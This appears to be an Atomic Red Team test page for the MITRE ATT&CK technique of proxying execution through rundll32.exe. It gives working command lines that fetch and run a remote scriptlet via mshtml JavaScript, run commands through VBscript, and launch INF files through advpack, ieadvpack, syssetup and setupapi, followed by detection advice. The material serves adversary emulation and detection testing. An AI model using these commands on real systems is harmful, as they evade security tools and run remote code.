# T1218.011 - Signed Binary Proxy Execution: Rundll32
Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.

Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Rundll32 execute JavaScript Remote Payload With GetObject
Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
```

Invoke-AtomicTest T1218.011 -TestNumbers 1

### Atomic Test #2 - Rundll32 execute VBscript command
Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
Upon execution calc.exe will be launched

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
```

Invoke-AtomicTest T1218.011 -TestNumbers 2

### Atomic Test #3 - Rundll32 advpack.dll Execution
Test execution of a command using rundll32.exe with advpack.dll.
Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
Upon execution calc.exe will be launched

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
```

Invoke-AtomicTest T1218.011 -TestNumbers 3

### Atomic Test #4 - Rundll32 ieadvpack.dll Execution
Test execution of a command using rundll32.exe with ieadvpack.dll.
Upon execution calc.exe will be launched

Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
```

Invoke-AtomicTest T1218.011 -TestNumbers 4

### Atomic Test #5 - Rundll32 syssetup.dll Execution
Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying "installation failed" will be opened

Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\#{inf_to_execute}
```

Invoke-AtomicTest T1218.011 -TestNumbers 5

### Atomic Test #6 - Rundll32 setupapi.dll Execution
Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying "installation failed" will be opened

Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\#{inf_to_execute}
```

Invoke-AtomicTest T1218.011 -TestNumbers 6

## Detection
Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.